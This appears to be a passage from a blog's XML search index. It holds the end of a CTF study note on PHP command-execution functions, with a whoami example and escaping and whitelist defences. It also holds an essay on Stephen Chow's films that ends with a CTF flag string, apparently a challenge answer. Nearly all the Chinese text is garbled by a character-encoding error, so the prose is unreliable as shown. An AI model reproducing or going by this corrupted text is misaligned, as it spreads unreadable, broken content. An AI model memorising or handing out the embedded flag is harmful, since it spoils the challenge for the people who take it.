ï¼Œå‘½ä»¤æ‰§è¡Œæ˜¯å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(æ¯”å¦‚CMDæˆ–è€…BASHå‘½ä»¤)ã€‚phpå‘½ä»¤æ‰§è¡Œæ˜¯ç»§æ‰¿webserverç”¨æˆ·æƒé™ã€‚</p><p>phpå‘½ä»¤æ‰§è¡Œå‡½æ•°:</p><ul><li>system</li><li>exec</li><li>shell_exec</li><li>passthru</li><li>pcntl_exec</li><li>popen</li><li>proc_popen</li><li>`</li></ul><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;whoami &gt;&gt; ./aaa.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é˜²èŒƒ</p><ul><li>ä½¿ç”¨escapeshellcmdã€escapeshellargé˜²æ­¢å‘½ä»¤æ³¨å…¥</li><li>å‚æ•°ç™½åå•</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿œå¤çš„ blog</title>
    <link href="/1970/01/01/flag_is_here/"/>
    <url>/1970/01/01/flag_is_here/</url>
    
    <content type="html"><![CDATA[<h1 id="äººç”Ÿä½•å¤„ä¸çª˜è¿«"><a href="#äººç”Ÿä½•å¤„ä¸çª˜è¿«" class="headerlink" title="äººç”Ÿä½•å¤„ä¸çª˜è¿«"></a>äººç”Ÿä½•å¤„ä¸çª˜è¿«</h1><p>â€‹ä¹Ÿè®¸å‘¨æ˜Ÿé©°ä»æ¥å°±ä¸éœ€è¦è¢«äººçœ‹æ‡‚ã€‚ä»–åªè´Ÿè´£è¡¨è¾¾ã€‚<br>â€‹ä½ çœ‹åˆ°ä»€ä¹ˆï¼Œå°±æ˜¯ä»€ä¹ˆã€‚<br>â€‹å½“ä½ è§‰å¾—è‡ªå·±çœ‹æ‡‚äº†å‘¨æ˜Ÿé©°ï¼Œå…¶å®æ˜¯é€šè¿‡å‘¨æ˜Ÿé©°çš„ä½œå“çœ‹æ‡‚äº†è‡ªå·±ã€‚</p><p>â€‹æˆ‘ä¸€ç›´åœ¨æ‰¾ä¸€ä¸ªè¯ï¼Œæ¥æ¦‚æ‹¬å‘¨æ˜Ÿé©°å¤§å¤šæ•°ä½œå“é‡Œçš„ä¸»è§’çš„å…±æ€§ï¼Œç°åœ¨æ‰¾åˆ°ä¸€ä¸ªï¼šçª˜è¿«ã€‚<br>â€‹ä»€ä¹ˆæ˜¯çª˜è¿«ï¼Ÿ<br>â€‹èƒ½åŠ›è¿½ä¸ä¸Šæ¢¦æƒ³ï¼Œ<br>â€‹è„šæ­¥è·Ÿä¸ä¸Šçµé­‚ï¼Œ<br>â€‹è®¡åˆ’èµ¶ä¸ä¸Šå˜åŒ–ã€‚<br>â€‹å…·ä½“ä¸€ç‚¹ï¼š<br>â€‹è¦é’±ï¼Œé’±æ²¡æœ‰ã€‚<br>â€‹è°ˆæƒ…ï¼Œæƒ…å¤±æ„ã€‚</p><p>â€‹å…ˆè¯´é’±ã€‚<br>â€‹å…¶å®å½“ä¸€ä¸ªäººç©·æƒ¯äº†ä¹‹åï¼Œæœ‰é’±æ²¡é’±åè€Œæ— æ‰€è°“ã€‚<br>â€‹è™½ç„¶æ¬²æœ›æ˜¯äººçš„æœ¬èƒ½ï¼Œä½†æ˜¯å‹åˆ¶æ¬²æœ›æ˜¯äººçš„æŠ€èƒ½ã€‚<br>â€‹ä¸ä¿¡ä½ çœ‹ï¼ŒæŠŠçŸ¥è¶³å¸¸ä¹æŒ‚åœ¨å˜´è¾¹çš„ï¼Œå¤§å¤šæ˜¯ç©·äººã€‚åœ¨å¤§éƒ¨åˆ†æ—¶å€™ï¼Œæ²¡é’±çš„çª˜è¿«éƒ½æ˜¯ä¸å€¼ä¸€æçš„ï¼Œæ— éæ˜¯è‹¦ä¸€ç‚¹å–½ï¼Œè‹¦ä¸­è¿˜èƒ½ä½œä¹å‘¢ã€‚<br>â€‹åªæ˜¯ï¼Œå½“ä½ åœ¨å¹³çš„äººé‡åˆ°çš„é—®é¢˜å¿…é¡»è¦ç”¨é’±æ¥è§£å†³çš„æ—¶å€™ï¼Œä½ æ‰ä¼šçœŸæ­£æ„è¯†åˆ°æ²¡é’±çš„çª˜è¿«ã€‚<br>â€‹æ¯”å¦‚ã€Šå–œå‰§ä¹‹ç‹ã€‹é‡Œçš„å°¹å¤©ä»‡ã€‚<br>â€‹åœ¨é‡åˆ°æŸ³é£˜é£˜ä¹‹å‰ï¼Œä»–æ¯å¤©åœ¨ç‰‡åœºæ··ç›’é¥­åƒã€‚<br>â€‹ç©·åˆå¦‚ä½•ï¼Ÿå…ˆæ··ç€ï¼Œåæ­£æœ‰å‰çƒ§é¥­åƒã€‚<br>â€‹ä½†æ˜¯åœ¨ä¸æŸ³é£˜é£˜å…±åº¦è‰¯å®µä¹‹åï¼Œä»–è’™äº†ã€‚<br>â€‹åœ¨è¯´å®Œâ€œæˆ‘å…»ä½ â€ä¹‹åï¼Œä»–æ›´è’™äº†ã€‚<br>â€‹å› ä¸ºæ²¡é’±ã€‚<br>â€‹ä½ åœ¨ä¹çš„äººï¼Œä¸æ˜¯ä¸€æœ¬ä¹¦ä¸æ˜¯ä¸€å—æ‰‹è¡¨ï¼Œä¸æ˜¯æ”¾åœ¨æŠ½å±‰é‡Œå°±èƒ½å¹³å®‰æ— äº‹çš„ã€‚<br>â€‹å½“ä½ åœ¨ä¹çš„æ˜¯ä¸€ä¸ªäººæ—¶ï¼Œæ˜¯è¦èŠ±é’±çš„ã€‚è™½ç„¶ä¸å¤šï¼Œä½†æ˜¯æ²¡æœ‰å°±æ˜¯æ²¡æœ‰ã€‚<br>â€‹é‚£å¥â€œæˆ‘å…»ä½ â€ï¼Œå£°éŸ³å¾ˆå¤§ï¼Œåº•æ°”ä¸è¶³ã€‚<br>â€‹ä½•æ­¢ä¸è¶³ï¼Œæ˜¯æ²¡æœ‰ã€‚<br>â€‹çª˜è¿«å—ï¼Ÿéå¸¸çª˜è¿«ã€‚</p><p>â€‹è¯´èµ·æ²¡é’±çš„çª˜è¿«ï¼Œæˆ‘æƒ³èµ·ä¸€æ¡å¤§å®¶å¯èƒ½éƒ½çœ‹è¿‡çš„æ®µå­ã€‚è¿™ä¸ªæ®µå­çš„åŸåˆ›è€…æ˜¯æˆ‘ä»¥å‰ä¸€èµ·ç©è¿‡è„±å£ç§€çš„ä¸€ä½å“¥ä»¬å„¿å«æ¢æµ·æºã€‚<br>â€‹æ®µå­å¤§æ„å¦‚ä¸‹:<br>â€‹æœ‰ä¸€å¤©çˆ¸çˆ¸é™ªæˆ‘é€›è¡—ï¼Œè·¯è¿‡ç©å…·åº—ï¼Œæˆ‘çœ‹ä¸­äº†ä¸€ä¸ªç©å…·ï¼Œéš”ç€æ©±çª—çœ‹äº†å¾ˆä¹…ã€‚<br>â€‹çˆ¸çˆ¸é—®æˆ‘:â€œå–œæ¬¢å—? â€<br>â€‹æˆ‘è¯´:â€œå–œæ¬¢! â€<br>â€‹çˆ¸çˆ¸è¯´:â€œå–œæ¬¢çš„â€¦.é‚£å°±å¤šçœ‹ä¸€ä¼šå„¿å§!â€<br>â€‹æˆ‘ä¿©å°±ä»ç™½å¤©ä¸€ç›´çœ‹åˆ°äº†æ™šä¸Šã€‚<br>â€‹åæ¥æˆ‘æ˜ç™½ä¸€ä¸ªé“ç†ï¼šçˆ±ä½ çš„äººä¸ä¸€å®šæ˜¯æ„¿æ„ä¸ºä½ èŠ±é’±çš„äººï¼Œè€Œæ˜¯æ„¿æ„èŠ±æ—¶é—´é™ªä½ çš„äººã€‚</p><p>â€‹è¿™ä¸ªæ®µå­æœ‰ä¸¤å±‚å–œå‰§æ•ˆæœã€‚<br>â€‹é¦–å…ˆæ˜¯çˆ¸çˆ¸é—®å®Œä¹‹åï¼ŒæŒ‰ç…§å¸¸è§„æ€ç»´ï¼Œçˆ¸çˆ¸åº”è¯¥æŠŠç©å…·ä¹°ä¸‹æ¥ã€‚<br>â€‹å¯è¿™ä¸ªå½“çˆ¸çš„åªæ˜¯è¯´äº†å¥â€œå–œæ¬¢é‚£å°±å¤šçœ‹ä¸€ä¼šå„¿å§â€ ã€‚<br>â€‹çª˜è¿«å—ï¼Ÿçª˜è¿«ã€‚ç®€ç›´æ˜¯å®åŠ›å‘å„¿ã€‚<br>â€‹åˆ«äººçš„çª˜è¿«ï¼Œåœ¨æ—è§‚è€…çœ‹æ¥ï¼Œæœ¬èº«å°±å·²ç»æ˜¯ä¸€ä¸ªç¬‘è¯ã€‚<br>â€‹è¿™ä¸ªæ®µå­å¹¶æ²¡æœ‰ç»“æŸï¼Œæ›´æ·±ä¸€å±‚çš„å–œå‰§æ•ˆæœåœ¨äºå„¿å­å¯¹çª˜è¿«çš„è§£è¯»:çˆ±ä½ çš„ä¸ä¸€ä¸€å®šæ˜¯æ„¿æ„ä¸ºä½ èŠ±é’±çš„äººï¼Œè€Œæ˜¯æ„¿æ„èŠ±æ—¶é—´é™ªä½ çš„äººã€‚</p><p>â€‹è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰äººè¯´å–œåˆ·çš„å†…æ ¸æ˜¯æ‚²å‰§ã€‚åœ¨è¿™ä¸ªæ•…äº‹é‡Œï¼Œä¸¤ä¸ªäººéƒ½æ˜¯çª˜è¿«çš„ã€‚<br>â€‹å½“çˆ¶äº²æ²¡æœ‰èƒ½åŠ›å»æ»¡è¶³å„¿å­ï¼Œä»–é™·å…¥äº†çª˜è¿«ã€‚<br>â€‹å½“å„¿å­æƒ³èµ·åˆ«äººå¯ä»¥æœ‰ç©å…·è€Œè‡ªå·±åªèƒ½éš”ç€æ©±çª—çœ‹ï¼Œä»–é™·å…¥äº†çª˜è¿«ã€‚<br>â€‹è¿™å°±æ˜¯æ™®é€šäººçš„ç”Ÿæ´»ç¼©å½±ã€‚ç©å…·ï¼Œåªæ˜¯ä¸€ä¸ªä»£ç ã€‚<br>â€‹åœ¨æ™®é€šäººçš„ç”Ÿæ´»ä¸­ï¼Œè¿™ä¸ªç©å…·å¯èƒ½æ˜¯è½¦å­ï¼Œæ˜¯æˆ¿å­ï¼Œæ˜¯æˆ’æŒ‡ï¼Œæ˜¯çˆ¶æ¯åŒ»è¯è´¹ï¼Œç”šè‡³æ˜¯å›å®¶çš„ç«è½¦ç¥¨ã€‚<br>â€‹ä¸å¹¸çš„æ˜¯ï¼Œç°å®å¯¹å¤§å¤šæ•°äººéƒ½æ˜¯æ®‹é…·çš„ã€‚<br>â€‹å¹¸è¿çš„æ˜¯ï¼Œç°å®è¿˜æ˜¯ç»™äº†ä½ äº‰å–ç©å…·çš„æœºä¼šã€‚</p><p>â€‹å…³äºç©å…·ï¼Œæœ€è¿‘æµè¡Œåœ¨æœ‹å‹åœˆçš„ä¸€ç¯‡æ–‡ç« ï¼Œä¹Ÿæåˆ°äº†å‘¨æ˜Ÿé©°ç«¥å¹´çš„ä¸€ä»¶ç±»ä¼¼çš„äº‹:<br>â€‹å‘¨æ˜Ÿé©°å›å¿†ä»–ç«¥å¹´æ—¶çœ‹ä¸­çš„ç©å…·:â€œæˆ‘å¸¸å¸¸éƒ½è¯´ä¸€ä¸ªæ•…äº‹ï¼Œå°±æ˜¯æˆ‘å°æ—¶å€™ï¼Œè·Ÿçˆ¸çˆ¸å¦ˆå¦ˆå‡ºå»é€›è¡—ï¼Œæˆ‘çœ‹è§ç©å…·ï¼Œä½†æ˜¯ä»–ä»¬éƒ½ä¸ä¹°ï¼Œæœ€åè¿˜æ‰“äº†æˆ‘ï¼Œå› ä¸ºæˆ‘è¦é—¹ï¼Œä¸€å®šè¦ä¹°ï¼Œä½†æ˜¯å¦ˆå¦ˆ-å®šä¸ä¹°ï¼Œæœ€åå¦ˆå¦ˆè¿˜æ‰“æˆ‘ï¼Œæˆ‘å°±è§‰å¾—ï¼Œä½ ä¸ä¹°è¿˜æ‰“æˆ‘ï¼Œå¤ªæ²¡æœ‰é“ç†äº†ï¼Œæˆ‘åªæ˜¯æƒ³è¦ä¸€ä¸ªç©å…·è€Œå·²ã€‚â€<br>â€‹â€œä½ ä¸ä¹°è¿˜æ‰“æˆ‘ï¼Œå¤ªæ²¡æœ‰é“ç†äº†ï¼Œæˆ‘åªæ˜¯æƒ³è¦ä¸€ä¸ªç©å…·è€Œå·²ã€‚â€<br>â€‹æ²¡æœ‰ä»»ä½•ä¸€ä¸ªå½“çˆ¶æ¯çš„æ„¿æ„çŸ¥é“å„¿å­åœ¨ç«¥å¹´ä¼šæœ‰è¿™æ ·ä¸€æ®µå†…å¿ƒç»å†ã€‚<br>â€‹è¿™æ ·çš„çª˜è¿«å°±ä¸ç”¨æ‹†å¼€è§£è¯»äº†ã€‚<br>â€‹å½“æ—¶å€™å‘¨æ˜Ÿé©°åº”è¯¥è¿˜å°ï¼Œä»–åªçŸ¥é“çª˜è¿«ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šçª˜è¿«ã€‚</p><p>â€‹å†åæ¥ï¼Œé€šè¿‡ä»–çš„å¦ä¸€ä»¶ç«¥å¹´å¾€äº‹ï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œä»–å·²ç»çŸ¥é“äº†ä¸ºä»€ä¹ˆçª˜è¿«ã€‚<br>â€‹å¹¼æ—¶å®¶å¢ƒè´«å›°ï¼Œè¿˜æœ‰ä¸¤ä¸ªå§å¦¹ï¼Œæ¯æ¬¡åƒé¥­æ¯äº²æ€»æŠŠè‚‰å¤®ç»™ä»–ï¼Œå¯æ¯æ¬¡å‘¨æ˜Ÿé©°éƒ½ä¼šæŠŠåƒå‰©ä¸‹çš„è‚‰æ”¾å˜´é‡Œå’¬ä¸€éå†åå‡ºæ¥ï¼Œæ›´è¿‡åˆ†çš„æ˜¯æœ‰ä¸€æ¬¡ä»–ç«ŸæŠŠæ•´ä¸ªé¸¡è…¿æ‰”åˆ°åœ°ä¸Šï¼Œæ¯äº²è®¤ä¸ºä»–å¾ˆè‡ªç§ï¼Œå¿ä¸ä½æ‰“äº†ä»–ã€‚<br>ç›´åˆ°åæ¥å‘¨æ˜Ÿé©°å¸¦æ¯äº²ä¸ŠèŠ‚ç›®ï¼Œç»ˆäºè¯´äº†è‡ªå·±é‚£ä¹ˆåšçš„åŸå› â€”â€”ä»–å‘ç°æ¯äº²å¾ˆå°‘åƒè‚‰ï¼Œ ä½†åˆå‘½ä»¤å‘¨æ˜Ÿé©°è¦æŠŠè‚‰åƒå®Œï¼Œäºæ˜¯å‘¨æ˜Ÿé©°æ•…æ„æŠŠè‚‰å¼„èƒœç•™ç»™å¦ˆå¦ˆåƒã€‚<br>â€‹è¿™æ—¶å€™å‘¨æ˜Ÿé©°å·²ç»æ˜¯ä¸€ä¸ªâ€œå¿ƒæœºå¨˜â€äº†ã€‚<br>â€‹çª˜è¿«çš„äººï¼Œè¡¨è¾¾çˆ±çš„æ–¹å¼æ˜¯ä¸åŒçš„ï¼ŒåŠ ä¸Šä»–å†…å‘çš„æ€§æ ¼ï¼Œé‚£ä½¿ä»–ç”¨æ›´å©‰è½¬çš„æ–¹å¼å»è¡¨è¾¾çˆ±ã€‚<br>â€‹ä»–ç”¨ä¸æ‡‚äº‹çš„æ–¹æ³•å»è¡¨è¾¾æ‡‚äº‹ã€‚</p><p>â€‹å¾ˆå¤šäººéƒ½è¯´è¿‡ï¼Œå°æ—¶å€™çœ‹å‘¨æ˜Ÿé©°çš„ç”µå½±æ˜¯ç¬‘ï¼Œé•¿å¤§äº†å†çœ‹ï¼Œæ˜¯å“­ã€‚<br>â€‹å› ä¸ºä½ çœ‹åˆ°äº†â€œè™â€ã€‚<br>â€‹å‘¨æ˜Ÿé©°å¤ªæ“…é•¿è™äº†ã€æ¯•ç«Ÿä»å°å°±æ‰‹åˆ°æ“’æ¥ã€‚</p><p>â€‹è¯´å®Œé’±ï¼Œè¯´æ„Ÿæƒ…ã€‚<br>â€‹åœ¨ã€Šå°‘æ—è¶³çƒã€‹é‡Œã€å‘¨æ˜Ÿé©°é¥°æ¼”çš„é˜¿æ˜Ÿä¸èµµè–‡é¥°æ¼”çš„é˜¿æ¢…æœ‰è¿™ä¹ˆä¸€æ®µå¯¹è¯ã€‚<br>â€‹é˜¿æ¢…:â€œæˆ‘å–œæ¬¢ä½ ã€‚ â€<br>â€‹é˜¿æ˜Ÿ:â€œæˆ‘ä¹Ÿå–œæ¬¢ä½ å•Šã€‚ â€<br>â€‹é˜¿æ¢…:â€œé‚£æˆ‘ä»¬ä¹‹é—´æ˜¯çˆ±æƒ…å—? â€<br>â€‹é˜¿æ˜Ÿ:â€œâ€¦ä½ æ˜¯å¼€ç©ç¬‘çš„å§? â€<br>â€‹é˜¿æ¢…:â€œæˆ‘æ˜¯è®¤çœŸé—®ä½ çš„ï¼Œ çœŸçš„ã€‚â€<br>â€‹é˜¿æ˜Ÿ:â€œé‚£å½“ç„¶ä¸æ˜¯çˆ±..æˆ‘ä»¬æ°¸è¿œéƒ½æ˜¯å¥½æœ‹å‹å˜›ï¼Œé‚£ä¸æ˜¯æ›´å¥½å—?<br>â€‹é˜¿æ¢…:â€œé‚£ä½ ä»¥åä¹Ÿå¯ä»¥å¸¸å¸¸æ¥æ‰¾æˆ‘ã€‚ é‹å­ç ´äº†ï¼Œæˆ‘è¿˜å¯ä»¥å¸®ä½ è¡¥ã€‚â€<br>â€‹é˜¿æ˜Ÿ:â€œä¸ç”¨äº†ï¼Œé‹å­ç ´äº†ï¼Œæˆ‘å°±æŠŠå®ƒæ‰”æ‰ã€‚æˆ‘ä»¬éƒ½è¦å‘å‰çœ‹å˜›ï¼Œæˆ‘æ°¸è¿œéƒ½ä¸è¦å†ç©¿ç ´é‹å­äº†ã€‚â€<br>â€‹é˜¿æ¢…å“­ã€‚<br>â€‹é˜¿æ˜Ÿ:â€œä½ ä¸è¦è¿™æ ·å­ï¼Œå¹²å—ä½ å“­äº†ï¼Œä¸è¦è¿™æ ·å­å˜›ã€‚â€<br>â€‹é˜¿æ¢…:  â€œæˆ‘æ˜ç™½äº†ï¼Œè°¢è°¢ä½ ã€‚â€<br>â€‹(è¡¥å……ä¸€å¥:è¿™åœºæˆè°ˆåˆ°äº†â€œçˆ±â€ï¼Œä½†çœŸæ­£ä½“ç°ä¸¤ä¸ªäººæ„Ÿæƒ…ç²¾é«“çš„ï¼Œæ˜¯è¿™åœºæˆå‰é¢çš„é‚£åœºæ²¡æœ‰æâ€œçˆ±â€çš„æˆã€‚éå¸¸ç²¾å½©ã€‚)</p><p>â€‹é˜¿æ˜Ÿå–œæ¬¢é˜¿æ¢…ï¼Œä½†ä¸æ•¢æ‰¿è®¤ã€‚å¾ˆç®€å•ï¼Œé˜¿æ¢…å¤ªä¸‘ã€‚<br>â€‹æ€ä¹ˆè¯´å‘¢ï¼Œé˜¿æ¢…è¿™ä¸ªè§’è‰²æ˜¯ä¸€åŒç ´æ—§çš„çƒé‹ï¼Œé˜¿æ˜Ÿæœ¬èº«ä¸æŠ—æ‹’ç ´æ—§çš„çƒé‹ï¼Œç”šè‡³è§‰å¾—ç©¿ç€èˆ’æœã€‚<br>â€‹ä½†æ˜¯ä»–æŠ—æ‹’åˆ«äººçœ‹ä»–çš„çœ¼å…‰ã€‚<br>â€‹â€œèµ°è‡ªå·±çš„è·¯ï¼Œè®©åˆ«äººå»è¯´å§ã€‚â€è¿™å¥è¯å¯¹å¤§éƒ¨åˆ†äººæ¥è¯´ï¼Œä¹Ÿåªæ˜¯è¯´è¯´è€Œå·²ã€‚<br>â€‹å°±ç®—æˆ‘ä»¬å·²ç»ä¸‹å®šå†³å¿ƒä¸åœ¨æ„åˆ«äººçš„çœ¼å…‰ï¼Œä½†ä¹Ÿéœ€è¦æ—¶é—´ã€‚<br>â€‹ä»–ä¸ä½†ä¸æ•¢æ‰¿è®¤ï¼Œè¿˜è¦å†æ¥ä¸€å‘â€œé‹å­ç ´äº†æˆ‘å°±æŠŠå®ƒæ‰”æ‰â€çš„æš´å‡»ã€‚<br>â€‹ä¸‘çš„æ˜¯é˜¿æ¢…ï¼Œè‡ªå‘çš„æ˜¯é˜¿æ˜Ÿã€‚<br>â€‹ä¸€ä¸ªç”·äººè¦å…‹æœè‡ªå‘ï¼Œä¸æ˜¯å»ç©¿-åŒå´­ æ–°çš„é«˜çº§çƒé‹ï¼Œè€Œæ˜¯åœ¨ä¹°å¾—èµ·æ–°çƒé‹ä¹‹åè¿˜æ„¿æ„é‡æ–°ç©¿ä¸Šé‚£åŒç ´æ—§çš„çƒé‹ã€‚<br>é‚£ä¸ªæ™šä¸Šï¼Œé˜¿æ˜Ÿæ²¡æœ‰è·¨è¿‡è¿™é“åï¼Œä»–è¿˜æ²¡æœ‰å…‹æœè‡ªå‘ï¼Œä»–é€‰æ‹©å‹æŠ‘çœŸå®çš„è‡ªå·±ã€‚<br>è¿˜æœ‰æ¯”è¿™æ›´çª˜è¿«çš„å—?</p><p>â€‹æœ‰ã€‚<br>â€‹åœ¨ã€ŠåŠŸå¤«ã€‹é‡Œã€‚<br>â€‹å‘¨æ˜Ÿé©°åœ¨å‘ç°é»„åœ£ä¾çš„çœŸå®èº«ä»½åï¼Œä»ç„¶æŠ¢äº†å¥¹çš„é’±ç½ã€‚<br>â€‹ä»–æœ¬å¯ä»¥åœæ­¢ï¼Œä½†ä»–é€‰æ‹©ç»§ç»­ã€‚<br>â€‹è¦é¢å­ï¼Œè£…åäººï¼Œè¿™æ˜¯æ²¡æœ‰æ„ä¹‰çš„æ‰§ç€ã€‚<br>â€‹æŠ¢å®Œä¹‹åï¼Œä»–è¿˜æ˜¯å´©æºƒäº†ï¼Œä¸€ä¸ªå–„è‰¯çš„ loser,åœ¨å¹²åäº‹æ–¹é¢ä¹Ÿæ˜¯å¤±è´¥é€é¡¶ã€‚<br>â€‹è¿™äº›å¹´ï¼Œæˆ‘è¿‡å¾—ä¸å¥½ï¼Œä½ è¿‡å¾—ä¸å·®ï¼Œè¿™è¾ˆå­æ ¹æœ¬æ²¡æƒ³è¿‡ä¼šå†è§é¢ã€‚<br>â€‹ä½†ä»Šæ—¥ä¸€è§ï¼Œæ²¡æƒ³åˆ°æ˜¯è¿™æ ·çš„æ–¹å¼ã€‚<br>â€‹åå…«å¹´å‰æˆ‘ä¿æŠ¤ä½ ä¸è¢«æµæ°“æ¬ºè´Ÿï¼Œåå…«å¹´åæˆ‘å˜æˆäº†æ¬ºè´Ÿä½ çš„æµæ°“ã€‚</p><p>â€‹è¿˜æœ‰æ¯”è¿™æœ‰çª˜è¿«çš„å—?æœ‰ã€‚<br>â€‹åœ¨ã€Šå›½äº§å‡Œå‡Œæ¼†ã€‹ä¸­ã€‚<br>â€‹è¢å’ä»ªå¸®å‘¨æ˜Ÿé©°å–å‡ºäº†å¤§è…¿ä¸Šçš„å­å¼¹ï¼Œå‘¨æ˜Ÿé©°å‘ç°è¿™é¢—å­å¼¹æ¥è‡ªè¢å’ä»ªçš„æªã€‚<br>â€‹ä»–å–œæ¬¢å¥¹ï¼Œå¹¶ä¸”ä¸ºå¥¹å»æ‘˜ç™½è‰²ç«ç‘°ï¼Œå´å› æ­¤æš´éœ²äº†è‡ªå·±çš„ä½ç½®ï¼Œè¢«è¢å’ä»ªçš„æªå‡»ä¸­ã€‚<br>â€‹æˆ‘æ„¿æ„ç»™ä½ çš„ä¸åªæ˜¯ç«ç‘°ï¼Œè¿˜æœ‰æˆ‘çš„å‘½ã€‚ä½†æˆ‘å´å‘ç°è¦æˆ‘å‘½çš„äººå±…ç„¶æ˜¯ä½ ?<br>â€‹äººç”Ÿä½•å¤„ä¸çª˜è¿«ã€‚æ€ªè°å‘¢?å¥½åƒä¹Ÿä¸çŸ¥é“æ€ªè°ã€‚<br>â€‹ä¹Ÿè®¸æ„Ÿæƒ…ä¸Šçš„æ— å˜å¤´å°±æ˜¯å†¤æ— å¤´å€ºæ— ä¸»ã€‚å¾ç°ç‰¹çš„å‘¨æ˜Ÿé©°å¤ªæ“…é•¿å¤„ç†è¿™äº›æ„Ÿæƒ…æˆã€‚çœ‹ä¼¼ä¹±æˆéº»ï¼Œå…¶å®ä¸€æ ¹çº¿ã€‚</p><p>â€‹å…³äºå‘¨æ˜Ÿé©°ï¼Œä¸æƒ³ç§°ä»–ä¸ºå¤§å¸ˆæˆ–ç¥ï¼Œä¹Ÿä¸æƒ³è¯´æ¬ ä»–ç”µå½±ç¥¨ã€‚<br>â€‹ä»–åªæ˜¯è¿™æ ·ä¸€ä¸ªå­˜åœ¨:è¿™ä¸ªè¡Œä¸šé‡Œæ‰€æœ‰äººéƒ½æƒ³è¶…è¶Šä»–ï¼ŒåŒ…æ‹¬ä»–è‡ªå·±ã€‚<br>â€‹æœ€åæœ‰ä¸€å¥è¯å…±å‹‰: æ¯ä¸€ä¸ªæ­£åœ¨åŠªåŠ›æ”¹å˜è‡ªå·±çª˜è¿«å‘½è¿çš„äººï¼Œéƒ½å€¼å¾—è¢«å°Šé‡ã€‚</p><blockquote><p>Here is your flag: <code>5_a_c@nner_can_Can_@_can&#125;</code></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
